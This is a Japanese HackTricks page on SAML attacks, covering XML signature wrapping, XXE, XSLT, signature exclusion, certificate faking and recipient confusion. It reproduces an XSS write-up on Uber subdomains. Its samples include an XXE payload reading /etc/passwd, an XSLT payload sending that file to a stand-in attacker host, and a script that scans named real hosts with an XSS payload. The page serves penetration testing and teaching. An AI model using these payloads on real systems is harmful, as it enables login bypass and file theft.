# SAML 攻撃

## SAML 攻撃

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に **参加する** か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## 攻撃グラフィック

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## ツール

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URL または URL のリストを取得し、SAML consume URL を出力するツールです。

## XML ラウンドトリップ

XML では、XML の署名された部分がメモリに保存され、その後いくつかのエンコーディング/デコーディングが実行され、署名がチェックされます。理想的には、そのエンコーディング/デコーディングはデータを変更すべきではありませんが、そのシナリオに基づいて、**チェックされるデータと元のデータが同じでない可能性があります**。

例えば、以下のコードをチェックしてください：
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
プログラムをREXML 3.2.4以前のバージョンで実行すると、以下の出力が得られます：
```
First child in original doc: Y
First child after round-trip: Z
```
以下は、上記のプログラムからの元のXMLドキュメントをREXMLがどのように見たかです：

![](<../../.gitbook/assets/image (561).png>)

そして、これは解析とシリアライズのラウンドの後にそれがどのように見えたかです：

![](<../../.gitbook/assets/image (562).png>)

脆弱性とその悪用方法についての詳細は：

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XMLシグネチャラッピング攻撃

XMLシグネチャを含むXMLドキュメントは通常、**シグネチャ** **検証**と**機能** **呼び出し**（ビジネスロジック）の**2つの独立したステップで処理されます**。両方のモジュールがデータに対して異なる見解を持っている場合、XMLシグネチャラッピング攻撃（XSW）と呼ばれる新しいクラスの脆弱性が存在します。\
これらの攻撃では、**攻撃者**は**XMLシグネチャを無効にしない**要素を**注入**して**メッセージ**構造を**変更します**。この変更の目的は、**アプリケーションロジックとシグネチャ検証モジュールがメッセージの異なる部分を使用するようにすることです**。結果として、受信者はXMLシグネチャを正常に検証しますが、アプリケーションロジックは偽の要素を処理します。**攻撃者はこのようにしてXMLシグネチャの完全性保護と起源認証を回避し**、任意の内容を注入することができます。

SAMLリクエストから：

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

攻撃者はシグネチャが見つかる新しいルート要素を**追加することができます**。したがって、バリデータがシグネチャの完全性をチェックするとき、それは**Response -> Assertion -> Subject**の**完全性をチェック**したと考えるかもしれませんが、赤で示された**悪意のある新しいResponse -> Assertion -> Subject**パスと混同して、そのデータを使用する可能性があります。

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

#1との違いは、使用されるシグネチャのタイプが**デタッチドシグネチャ**であり、XSW #1ではエンベローピングシグネチャが使用されていたことです。\
新しい悪意のある構造が以前と同じで、完全性チェックが実行された後のビジネスロジックを混乱させようとしていることに注意してください。

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

この攻撃では、元のアサーションと同じレベルで**悪意のあるアサーションが作成され**、ビジネスロジックを混乱させて悪意のあるデータを使用しようとします。

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4は#3に似ていますが、この場合、**元のアサーションがコピーされたアサーションの子**になります。

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

XSW #5では、シグネチャと元のアサーションがエンベロープド/エンベローピング/デタッチドの3つの標準構成のいずれかに含まれていません。この場合、コピーされたアサーションがシグネチャを包む形になります。

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6は、コピーされたアサーションを#4および#5と同じ場所に挿入します。ここで興味深いのは、コピーされたアサーションがシグネチャを包み、そのシグネチャが元のアサーションを包むということです。

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7は**Extensions**要素を挿入し、コピーされた**Assertion**を**子**として追加します。Extensionsは**より制約の少ないスキーマ定義**を持つ有効なXML要素です。この[ホワイトペーパー](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)の著者は、OpenSAMLライブラリに対応してこの方法を開発しました。OpenSAMLはスキーマ検証を使用して、シグネチャ検証中に使用されるIDと処理されたアサーションのIDを正しく比較しました。著者は、元のアサーションと同じIDを持つコピーされたアサーションがより制約の少ないスキーマ定義を持つ要素の子である場合、彼らはこの特定の対策を回避することができたと発見しました。

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8は、XSW #7で使用された攻撃パターンの変種を実行するために、別の**より制約の少ないXML要素**を使用します。今回は、元のアサーションがコピーされたアサーションではなく、より制約の少ない要素の子です。

![](<../../.gitbook/assets/image (545).png>)

### ツール

リクエストを解析し、選択したXSW攻撃を適用して起動するために、Burp拡張機能の[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)を使用できます。

![](<../../.gitbook/assets/image (546).png>)

### 元の論文

この攻撃についての詳細は、元の論文を[https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)で読んでください。

## XXE

XXE攻撃の種類がわからない場合は、以下のページを読んでください：

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAMLレスポンスがdeflatedされbase64でエンコードされた**XMLドキュメント**であるため、SAMLレスポンスとして送信されるXMLドキュメントを操作することで**XXE**をテストすることができます。例：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### ツール

Burp拡張機能の [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) を使用して、SAMLリクエストからXXEの脆弱性をテストするためのPOCを生成することもできます。

このトークもチェックしてください: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML経由のXSLT

XSLTについての詳細はこちらをご覧ください:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformation (XSLT) は、XMLドキュメントをHTML、JSON、PDFなどの他のドキュメントタイプに変換するためのチューリング完全な言語です。ここで注目すべき重要な点は、**攻撃に有効な署名が必要ないことです**。その理由は、**XSLT変換がデジタル署名が検証のために処理される前に行われるからです**。基本的に、攻撃を行うには署名されたSAMLレスポンスが必要ですが、署名は自己署名または無効でも構いません。

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

ここには、この種の脆弱性をチェックするための**POC**があります。このセクションの冒頭で言及されたhacktricksページには、ペイロードを見つけることができます。
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### ツール

Burp拡張機能の [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) を使用して、SAMLリクエストからPOCを生成し、可能なXSLTの脆弱性をテストできます。

このトークもチェックしてください: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML署名の除外 <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

署名の除外は、**Signature要素がない**場合にSAML実装がどのように振る舞うかをテストするために使用されます。Signature要素が**欠如している**と、**署名検証ステップが完全にスキップされる可能性があります**。Signatureが検証されない場合、通常署名される内容は攻撃者によって改ざんされる可能性があります。

![](<../../.gitbook/assets/image (547).png>)

### ツール <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

署名の除外は、SAMLレスポンスをインターセプトし、`Remove Signatures`をクリックすることから始まります。これにより、**すべての**Signature要素が削除されます。

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

署名を削除した後、リクエストを対象に進めます。SignatureがServiceによって必要とされていない場合

## 証明書の偽造 <a href="#certificate-faking" id="certificate-faking"></a>

証明書の偽造は、Service Providerが信頼されたIdentity Providerによって署名されたSAMLメッセージであることを**検証するかどうか**をテストするプロセスです。SPとIdP間の信頼関係は確立され、SAMLメッージが受信されるたびに**検証されるべき**です。これは、**自己署名**された証明書を使用してSAMLレスポンスまたはアサーションに署名することになります。

### ツール <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

Burp拡張機能の [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) を使用します。\
証明書を偽造するには、SAMLレスポンスをインターセプトすることから始めます。\
レスポンスにSignatureが含まれている場合は、`Send Certificate to SAML Raider Certs`ボタンを使用します。

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

証明書を送信した後、SAML RaiderのCertificatesタブにインポートされた証明書が表示されるはずです。そこで、インポートされた証明書をハイライトし、`Save and Self-Sign`ボタンを押します。

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

これにより、元の証明書の自己署名クローンが生成されます。次に、BurpのProxyで保持されているインターセプトされたリクエストに戻ります。まず、XML Signatureドロップダウンメニューから新しい自己署名証明書を選択します。次に、`Remove Signatures`ボタンを使用して既存の署名を削除します。最後に、**`(Re-)Sign Message`**または`(`**`Re-)Sign Assertion`**ボタン（**状況に応じて** **より** **適切な**方）を使用します。

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

自己署名証明書でメッセージに署名した後、送信します。認証できれば、SAMLメッセージに署名できることがわかります。SAMLメッセージに署名できるということは、アサーションの値を変更してもService Providerに受け入れられることを意味します。

## トークン受信者の混乱 / Service Providerターゲットの混乱 <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

トークン受信者の混乱 / Service Providerターゲットの混乱は、Service Providerが受信者を**検証するかどうか**をテストします。つまり、**異なるService Provider向けのレスポンスであった場合**、**現在の**Service Providerはそれに気づき、**認証を拒否する**べきです。\
**Recipient**フィールドは、SAMLレスポンスのSubject要素の子である**SubjectConfirmationData**要素の属性です。

> SubjectConfirmationData要素は、主体の確認を可能にする追加データを指定するか、主体の確認の行為が行われる状況を制約します。主体の確認は、アサーションを提示するエンティティ（つまり、証明するエンティティ）とアサーションの主張の主体との関係を検証しようとする依存パーティが行うときに発生します。

**SubjectConfirmationData要素にあるRecipient属性は、アサーションが配信されるべき場所を指定するURLです**。Recipientが受け取るService Providerと異なる場合、アサーションは受け入れられるべきではありません。

### 方法 <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAMLトークン受信者の混乱（SAML-TRC）は、搾取を試みるためにいくつかの前提条件があります。まず、**Service Providerに正当なアカウントを持っている必要があります**。次に、**SP-TargetはSP-Legitがサービスする同じIdentity Providerによって発行されたトークンを受け入れる必要があります**。

条件が真であれば、攻撃は比較的簡単です。共有Identity Providerを介して**SP-Legit**に**認証**します。次に、IdPからSP-LegitへのSAMLレスポンスの途中でインターセプトします。インターセプトしたら、**SP-Legit向けだったSAMLレスポンスをSP-Targetに代わりに送信します。**もし**SP-Targetがアサーションを受け入れる**場合、SP-Legitの同じアカウント名でログインし、SP-Targetの対応するリソースにアクセスできることになります。

## ログアウト機能のXSS

([元の研究はこちら](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

ディレクトリブルートフォーシングを実行した後、次のページを見つけました：
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
ログアウトページです。上記のリンクを開いたところ、次のページにリダイレクトされました。
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
ベースパラメータがURLを取得しているので、古典的な `javascript:alert(123);` に置き換えてXSSをトリガーしてみてはどうでしょうか。

### 大量悪用

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) を使用して、URLのリストを取得し、コールバック（SAMLコンシューム）URLを返すことができるため、`uberinternal.com` のすべてのサブドメインをツールにフィードして、同じライブラリを使用している他のドメインがあるかどうかを確認しました。そして、ありました。

次に行ったことは、脆弱なページ `oidauth/prompt` を呼び出し、XSSを試み、入力が反映された場合には、脆弱であるというメッセージを表示するスクリプトを作成することでした。
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## 参考文献

攻撃方法は[https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)から取得しました。\
追加のリソースとライトアップは[https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)で見つけることができます。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
